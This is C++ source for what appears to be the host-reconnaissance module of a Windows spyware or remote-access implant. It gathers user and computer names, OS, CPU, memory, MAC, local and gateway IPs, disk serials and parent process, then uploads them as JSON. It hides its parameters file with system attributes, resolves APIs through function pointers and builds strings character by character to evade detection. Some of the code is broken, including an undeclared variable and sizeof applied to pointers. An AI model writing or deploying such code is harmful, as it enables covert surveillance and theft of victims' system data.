#include "../api.h"
#include "../public.h"
#include "interface.h"
#include <Windows.h>
#include <Winternl.h>
#include <lm.h>
#include "../network/NetWorkdata.h"
#include "InstallApps.h"
#include "RunningProcess.h"
#include "DeviceInfo.h"
#include <string>
#include "../StrHelper.h"
#include "../log.h"
#include "../FileHelper.h"

using namespace std;


void checkParams(unsigned char* macaddr) {
	int iret = 0;
	string fn = string(strDataPath) + PARAMS_FILENAME;
	HANDLE hf = lpCreateFileA((char*)fn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return;
	}

	DWORD dwcnt = 0;
	int filesize = lpGetFileSize(hf, 0);
	if (filesize && filesize == sizeof(PROGRAM_PARAMS))
	{
		PROGRAM_PARAMS params;
		iret = lpReadFile(hf, (char*)&params, filesize, &dwcnt, 0);
		if (params.uninstall)
		{
			ExitProcess(0);
		}
		memcpy(macaddr, params.mac, MAC_ADDRESS_LENGTH);
	}
	else {
		PROGRAM_PARAMS params;
		params.uninstall = 0;
		memcpy(params.mac, macaddr, MAC_ADDRESS_LENGTH);
		iret = lpWriteFile(hf, (char*)&params, sizeof(PROGRAM_PARAMS), &dwcnt, 0);
	}

	lpCloseHandle(hf);

	iret = SetFileAttributesA(fn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
	return;
}


int GetNetCardInfo(char* strIP, unsigned char* cMac, char* strMac, char* szInetIP, char* strGateWayIP, char* strGateWayMac)
{
	int iret = 0;

	char szMacFormat[] = { '%','0','2','X','_','%','0','2','X','_','%','0','2','X','_','%','0','2','X','_','%','0','2','X','_','%','0','2','X',0 };
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)lpGlobalAlloc(GPTR, sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL)
	{
		return FALSE;
	}
	// Make an initial call to GetAdaptersInfo to get the necessary size into the ulOutBufLen variable 
	if (lpGetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
	{
		lpGlobalFree((char*)pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)lpGlobalAlloc(GPTR, ulOutBufLen);
		if (pAdapterInfo == NULL)
		{
			return FALSE;
		}
	}

	//no netcard will cause this function return error
	if (lpGetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR)
	{
		for (PIP_ADAPTER_INFO pAdapter = pAdapterInfo; pAdapter != NULL; pAdapter = pAdapter->Next)
		{
			// 确保是以太网 
			if (pAdapter->Type != MIB_IF_TYPE_ETHERNET && pAdapter->Type != IF_TYPE_IEEE80211) {
				continue;
			}
			// 确保MAC地址的长度为 00-00-00-00-00-00 
			if (pAdapter->AddressLength != MAC_ADDRESS_LENGTH) {
				continue;
			}

			//不管有没有联网，mac都是可以获取的。如果没有联网，那么下面的ip和网关ip都是空的，为了避免出现错误，先把mac地址获取
			memcpy(cMAC, pAdapter->Address, MAC_ADDRESS_LENGTH);

			lpwsprintfA(strMac, szMacFormat,
				(pAdapter->Address[0]), (pAdapter->Address[1]), (pAdapter->Address[2]), (pAdapter->Address[3]), (pAdapter->Address[4]), (pAdapter->Address[5]));

			if (lplstrlenA(pAdapter->IpAddressList.IpAddress.String) < 8 || lplstrlenA(pAdapter->GatewayList.IpAddress.String) < 8)
			{
				continue;
			}

			if (lpRtlCompareMemory(pAdapter->IpAddressList.IpAddress.String, "0.0.0.0", 7) != 7 &&
				lpRtlCompareMemory(pAdapter->GatewayList.IpAddress.String, "0.0.0.0", 7) != 7)
			{
				memmove(cMAC, pAdapter->Address, MAC_ADDRESS_LENGTH);
				lpwsprintfA(strMac, szMacFormat,
					(pAdapter->Address[0]), (pAdapter->Address[1]), (pAdapter->Address[2]), (pAdapter->Address[3]), (pAdapter->Address[4]), (pAdapter->Address[5]));

				lpRtlZeroMemory(strGateWayIP, sizeof(strGateWayIP));
				lpRtlMoveMemory(strGateWayIP, pAdapter->GatewayList.IpAddress.String, lplstrlenA(pAdapter->GatewayList.IpAddress.String));

				lpRtlZeroMemory(strIP, sizeof(strIP));
				lpRtlMoveMemory(strIP, pAdapter->IpAddressList.IpAddress.String, lplstrlenA(pAdapter->IpAddressList.IpAddress.String));

				iret = TRUE;
				break;
			}
		}
	}

	lpGlobalFree((char*)pAdapterInfo);

	checkParams(cMac);
	return iret;
}

//ip-api.com
//http://api.ipify.org
//http://icanhazip.com/
//http://ip-api.com/line/
int GetInetIPAddress(char* ip) {
	
	lplstrcpyA(gLocation, "");

	lplstrcpyA(gNetworkType, "");

	return 0;

	int ret = 0;

	//char szhost[] = { 'i','p','-','a','p','i','.','c','o','m',0 };
	//char szhost[] = { 'a','p','i','.','i','p','i','f','y','.','o','r','g',0 };
	char szhost[] = { 'i','c','a','n','h','a','z','i','p','.','c','o','m',0 };
	hostent* pHostent = lpgethostbyname(szhost);
	if (pHostent == 0)
	{
		return 0;
	}

	ULONG  pPIp = *(DWORD*)((CHAR*)pHostent + sizeof(hostent) - sizeof(DWORD_PTR));
	ULONG  pIp = *(ULONG*)pPIp;
	DWORD dwip = *(DWORD*)pIp;

	char* httprequestformat = \
		"GET %s HTTP/1.1\r\n"\
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"\
		"Accept-Language: zh-CN\r\n"\
		"Upgrade-Insecure-Requests: 1\r\n"\
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\r\n"
		"Accept-Encoding: gzip, deflate\r\n"\
		"Host: %s\r\n"\
		"Connection: Keep-Alive\r\n\r\n";

	//char szurl[] = { '/','l','i','n','e','/',0 };

	char szurl[] = { '/',0 };

	char httprequest[1024];
	int httplen = lpwsprintfA(httprequest, httprequestformat, szurl, szhost);

	sockaddr_in stServSockAddr = { 0 };
	stServSockAddr.sin_addr.S_un.S_addr = dwip;
	stServSockAddr.sin_port = lpntohs(HTTP_PORT);
	stServSockAddr.sin_family = AF_INET;

	SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, 0);
	if (hSock == INVALID_SOCKET)
	{
		return 0;
	}

	ret = lpconnect(hSock, (sockaddr*)&stServSockAddr, sizeof(sockaddr_in));
	if (ret == INVALID_SOCKET)
	{
		lpclosesocket(hSock);
		return 0;
	}

	ret = lpsend(hSock, httprequest, httplen, 0);
	if (ret <= 0)
	{
		lpclosesocket(hSock);
		return 0;
	}

	char buf[0x1000];
	int recvlen = lprecv(hSock, buf, sizeof(buf), 0);
	lpclosesocket(hSock);
	if (recvlen <= 0 || recvlen >= sizeof(buf))
	{
		return 0;
	}
	*(UINT*)(buf + recvlen) = 0;

	lplstrcpyA(gLocation, "");

	lplstrcpyA(gNetworkType, buf);

	/*
	char* p = strstr(buf, "\r\n\r\n");
	if (p)
	{
		p += lplstrlenA("\r\n\r\n");

		string ipinfo = string(p);
		vector<string>result = splitstr(ipinfo, "\n");
		if (result.size() >= 13)
		{
			lplstrcpyA(ip, result[13].c_str());

			string loc = result[1] + " " + result[4] + " " + result[5] + "," + result[7] + " " + result[8];

			for (int i = 0; i < loc.length(); i++)
			{
				if (loc.at(i) == '\'' || loc.at(i) == '\"')
				{
					loc.at(i) = ' ';
				}
			}

			lplstrcpyA(gLocation, loc.c_str());

			lplstrcpyA(gNetworkType, result[12].c_str());

			return TRUE;
		}
	}*/

	return FALSE;
}



int GetInetIPAddressIP138(char* szInetIP) {

	char* _szIp138Url = \
		"GET /ic.asp HTTP/1.1\r\n"\
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\n"\
		"Referer: %s\r\n"\
		"Accept-Language: zh-CN\r\n"\
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\r\n"
		"Accept-Encoding: gzip, deflate\r\n"\
		"Host: %s\r\n"\
		"Connection: Keep-Alive\r\n\r\n";

	SYSTEMTIME sttime = { 0 };
	GetLocalTime(&sttime);
	char szIp138Host[1024];
	lpwsprintfA(szIp138Host, "%u.ip138.com", sttime.wYear);

	//char szIp138Host[]		= {'2','0','1','8','.','i','p','1','3','8','.','c','o','m',0};
	char szIp138Referer[] = { 'h','t','t','p',':','/','/','w','w','w','.','i','p','1','3','8','.','c','o','m','/',0 };

	//no netcard will cause this function return 0
	hostent* pHostent = lpgethostbyname(szIp138Host);
	if (pHostent == 0)
	{
		writeLog("GetInetIPAddress lpgethostbyname error\r\n");
		return FALSE;
	}
	ULONG  pPIp = *(DWORD*)((CHAR*)pHostent + sizeof(hostent) - sizeof(DWORD_PTR));
	ULONG  pIp = *(ULONG*)pPIp;
	DWORD dwip = *(DWORD*)pIp;
	sockaddr_in stServSockAddr = { 0 };
	stServSockAddr.sin_addr.S_un.S_addr = dwip;
	stServSockAddr.sin_port = lpntohs(HTTP_PORT);
	stServSockAddr.sin_family = AF_INET;

	SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, 0);
	if (hSock == INVALID_SOCKET)
	{
		writeLog("GetInetIPAddress lpsocket error\r\n");
		return FALSE;
	}

	int iRet = lpconnect(hSock, (sockaddr*)&stServSockAddr, sizeof(sockaddr_in));
	if (iRet == INVALID_SOCKET)
	{
		writeLog("GetInetIPAddress lpconnect error\r\n");
		lpclosesocket(hSock);
		return FALSE;
	}

#define IP138_NETWORK_BUFSIZE 0X4000
	char szIp138Buf[IP138_NETWORK_BUFSIZE];
	iRet = lpwsprintfA(szIp138Buf, _szIp138Url, szIp138Referer, szIp138Host);
	iRet = lpsend(hSock, szIp138Buf, iRet, 0);
	if (iRet <= 0)
	{
		writeLog("GetInetIPAddress lpsend error\r\n");
		lpclosesocket(hSock);
		return FALSE;
	}

	iRet = lprecv(hSock, szIp138Buf, IP138_NETWORK_BUFSIZE, 0);
	if (iRet <= 0)
	{
		writeLog("GetInetIPAddress lprecv error\r\n");
		lpclosesocket(hSock);
		return FALSE;
	}
	*(UINT*)(szIp138Buf + iRet) = 0;
	lpclosesocket(hSock);

	char szFlagHdr[] = { '<','c','e','n','t','e','r','>',0 };
	char szFlagEnd[] = { '<','/','c','e','n','t','e','r','>',0 };
	char* pInetIp = _lpstrstr(szIp138Buf, szFlagHdr);
	if (pInetIp)
	{
		pInetIp += lplstrlenA(szFlagHdr);
		char* pInetIpEnd = _lpstrstr(pInetIp, szFlagEnd);
		if (pInetIpEnd)
		{
			lpRtlZeroMemory(szInetIP, sizeof(szInetIP));
			lpRtlMoveMemory(szInetIP, pInetIp, pInetIpEnd - pInetIp);
			writeLog("GetInetIPAddress ok\r\n");
			return TRUE;
		}
	}

	return FALSE;
}




BOOL  DoIdentify(HANDLE hPhysicalDriveIOCTL, PSENDCMDINPARAMS pSCIP, PSENDCMDOUTPARAMS pSCOP, BYTE btIDCmd, BYTE btDriveNum, PDWORD pdwBytesReturned)
{
	pSCIP->cBufferSize = IDENTIFY_BUFFER_SIZE;
	pSCIP->irDriveRegs.bFeaturesReg = 0;
	pSCIP->irDriveRegs.bSectorCountReg = 1;
	pSCIP->irDriveRegs.bSectorNumberReg = 1;
	pSCIP->irDriveRegs.bCylLowReg = 0;
	pSCIP->irDriveRegs.bCylHighReg = 0;

	pSCIP->irDriveRegs.bDriveHeadReg = (btDriveNum & 1) ? 0xB0 : 0xA0;
	pSCIP->irDriveRegs.bCommandReg = btIDCmd;
	pSCIP->bDriveNumber = btDriveNum;
	pSCIP->cBufferSize = IDENTIFY_BUFFER_SIZE;

	return lpDeviceIoControl(hPhysicalDriveIOCTL, SMART_RCV_DRIVE_DATA, (LPVOID)pSCIP, sizeof(SENDCMDINPARAMS) - 1,
		(LPVOID)pSCOP, sizeof(SENDCMDOUTPARAMS) + IDENTIFY_BUFFER_SIZE - 1, pdwBytesReturned, NULL);

}

char* ConvertToString(DWORD dwDiskData[256], int nFirstIndex, int nLastIndex)
{
	static char szResBuf[1024] = { 0 };
	char ss[256];
	int nIndex = 0;
	int nPosition = 0;

	for (nIndex = nFirstIndex; nIndex <= nLastIndex; nIndex++)
	{
		ss[nPosition] = (char)(dwDiskData[nIndex] / 256);
		nPosition++;
		ss[nPosition] = (char)(dwDiskData[nIndex] % 256);
		nPosition++;
	}

	// End the string
	ss[nPosition] = '\0';

	int i, index = 0;
	for (i = 0; i < nPosition; i++)
	{
		if (ss[i] == 0 || ss[i] == 32)
			continue;
		szResBuf[index] = ss[i];
		index++;
	}
	szResBuf[index] = 0;

	return szResBuf;
}



/*
GET / HTTP/1.1
Host: api.ipify.org
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

HTTP/1.1 200 OK
Content-Length: 15
Content-Type: text/plain
Date: Sat, 20 May 2023 14:49:32 GMT
Vary: Origin

103.159.124.195
*/

BOOL getInetIpAddress_ipify() {


	return 0;
}



BOOL GetHardDiskSerialNo(int driver, char* szHDSerialNumber, char* szHDModelNumber)
{
	int iRet = 0;

	const WORD IDE_ATAPI_IDENTIFY = 0xA1;		// 读取ATAPI设备的命令
	const WORD IDE_ATA_IDENTIFY = 0xEC;		// 读取ATA设备的命令
	wchar_t szText[MAX_PATH] = { 0 };
	char szPhysicalDrive[] = { '\\','\\','.','\\','P','H','Y','S','I','C','A','L','D','R','I','V','E','%','d',0 };
	wchar_t wszPhysicalDrive[MAX_PATH] = { 0 };

	int iLen = lpMultiByteToWideChar(CP_ACP, 0, szPhysicalDrive, lplstrlenA(szPhysicalDrive), wszPhysicalDrive, MAX_PATH);
	iLen = lpwsprintfW(szText, wszPhysicalDrive, driver);

	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = lpCreateFileW(szText, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		iRet = lpRtlGetLastWin32Error();
		return FALSE;
	}

	DWORD dwBytesReturned;
	GETVERSIONINPARAMS gvopVersionParams;
	if (lpDeviceIoControl(hFile, SMART_GET_VERSION, NULL, 0, &gvopVersionParams, sizeof(gvopVersionParams), &dwBytesReturned, NULL) == NULL)
	{
		int iError = lpRtlGetLastWin32Error();
		char strError[1024];
		lpwsprintfA(strError, "GetHardDiskInfo lpDeviceIoControl error code is:%u\r\n", iError);
		writeLog(strError);
		return FALSE;
	}

	//if(gvopVersionParams.bIDEDeviceMap <= 0)	return -2;
	// IDE or ATAPI IDENTIFY cmd
	int btIDCmd = 0;
	SENDCMDINPARAMS InParams;
	int nDrive = 0;
	btIDCmd = (gvopVersionParams.bIDEDeviceMap >> nDrive & 0x10) ? IDE_ATAPI_IDENTIFY : IDE_ATA_IDENTIFY;
	//btIDCmd = (gvopVersionParams.bIDEDeviceMap >> nDrive & 0x10) ? IDE_ATAPI_IDENTIFY : IDE_ATA_IDENTIFY;
	BYTE btIDOutCmd[sizeof(SENDCMDOUTPARAMS) + IDENTIFY_BUFFER_SIZE - 1];

	if (DoIdentify(hFile, &InParams, (PSENDCMDOUTPARAMS)btIDOutCmd, (BYTE)btIDCmd, (BYTE)nDrive, &dwBytesReturned) == FALSE)
	{
		int iError = lpRtlGetLastWin32Error();
		char strError[1024];
		lpwsprintfA(strError, "GetHardDiskInfo DoIdentify error code is:%u\r\n", iError);
		writeLog(strError);
		return FALSE;
	}
	lpCloseHandle(hFile);

	DWORD dwDiskData[256] = { 0 };
	USHORT* pIDSector = NULL;

	pIDSector = (USHORT*)((SENDCMDOUTPARAMS*)btIDOutCmd)->bBuffer;
	for (int i = 0; i < 256; i++)	dwDiskData[i] = pIDSector[i];

	lpRtlZeroMemory(szHDSerialNumber, sizeof(szHDSerialNumber));
	lplstrcpyA(szHDSerialNumber, ConvertToString(dwDiskData, 10, 19));

	lpRtlZeroMemory(szHDModelNumber, sizeof(szHDModelNumber));
	lplstrcpyA(szHDModelNumber, ConvertToString(dwDiskData, 27, 46));

	return TRUE;
}









int __stdcall GetMachineInfo()
{
	__try
	{
		int iRet = 0;

		char strCpuBrand[256];
		char* pCpu = GetCPUBrand(strCpuBrand);

		iRet = GetUserAndComputerName(strUserName, strComputerName);
		iCpuBits = GetOsBits();
		iSystemVersion = GetWindowsVersion(strSysVersion);
		iRet = GetSystemDir(szSysDir);

		iRet = GetParentProcName(szParentProcName);
		iRet = GetDiskVolumeSerialNo(&ulVolumeSerialNo);
		iRet = GetNetCardInfo(strLocalIP, cMAC, strLocalMac, strExternalIP, strGateWayIP, strGateWayMac);
		iRet = GetHostName(strHostName);

		SYSTEM_INFO stSysInfo;
		lpGetSystemInfo(&stSysInfo);
		dwCpuCnt = stSysInfo.dwNumberOfProcessors;
		dwMemPageSize = stSysInfo.dwPageSize;

		MEMORYSTATUSEX statex;
		statex.dwLength = sizeof(statex);
		iRet = lpGlobalMemoryStatusEx(&statex);
		dwTotalMemory = statex.ullTotalPhys >> 32;
		dwAvilableMem = statex.ullAvailPhys >> 32;
		char sztotalmem[64];
		lpwsprintfA(sztotalmem, "%I64d", dwTotalMemory);

		//iRet = GetHardDiskSerialNo(0,szHDSerialNumber,szHDModelNumber);

		char strDiskSpaceInfo[0x1000];
		iRet = GetDiskSpaceInfo(strDiskSpaceInfo);

		iRet = GetInetIPAddress(strExternalIP);

		Json::StyledWriter stylewriter;

		Json::Value info;
		info["computerName"] = strHostName;
		info["userName"] = strUserName;
		info["systemVersion"] = strSysVersion;
		char szproc[256];
		lpwsprintfA(szproc, "%s(%d位%d核)", strCpuBrand, iCpuBits, stSysInfo.dwNumberOfProcessors);
		info["Processor"] = szproc;
		info["phisicalMemory"] = sztotalmem;
		info["diskSerialNO"] = szHDSerialNumber;
		info["diskModelNO"] = szHDModelNumber;
		info["diskVolumeNO"] = (unsigned int)ulVolumeSerialNo;
		info["diskInfo"] = strDiskSpaceInfo;
		info["MAC"] = strLocalMac;
		info["localIP"] = strLocalIP;
		info["netIP"] = strExternalIP;
		info["gateWayIP"] = strGateWayIP;
		char szresolution[64];
		lpwsprintfA(szresolution, "%u*%u", ScrnResolutionX, ScrnResolutionY);
		info["resolution"] = szresolution;
		info["location"] = gLocation;
		info["networkType"] = gNetworkType;

		string parentproc = szParentProcName;
		back2forwardSlash(parentproc);
		info["entrance"] = parentproc;

		string infojson = stylewriter.write(info);

		iRet = uploadData((char*)infojson.c_str(), infojson.length(), SYSTEMINFO, 0);

#ifdef _DEBUG
		char strFilePath[MAX_PATH] = { 0 };
		iRet = makeFullFileName(strFilePath, MACHINE_INFO_FILENAME);
		FileHelper::fileWriter(strFilePath, (char*)infojson.c_str(), infojson.length(), FALSE);
		SetFileAttributesA(strFilePath, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
#endif

		return TRUE;
	}
	__except (1)
	{
		writeLog("GetMachineInfo exception!\r\n");
		return FALSE;
	}
}